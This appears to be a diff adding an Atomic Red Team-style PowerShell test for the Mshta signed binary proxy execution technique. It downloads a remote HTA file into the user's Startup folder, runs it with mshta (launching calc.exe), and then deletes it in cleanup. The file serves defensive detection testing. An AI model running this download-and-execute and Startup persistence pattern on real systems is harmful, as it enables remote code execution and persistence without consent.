@@ -1,0 +1,14 @@
+#TechniqueName: Signed Binary Proxy Execution: Mshta
+#AtomicTestName: Mshta Executes Remote HTML Application (HTA)
+#Description: Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.&
+#Language: ps1
+
+#commands
+$var =Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"
+$var.content|out-file "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"
+mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"
+
+
+#cleanup_commands
+remove-item "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta" -ErrorAction Ignore
+
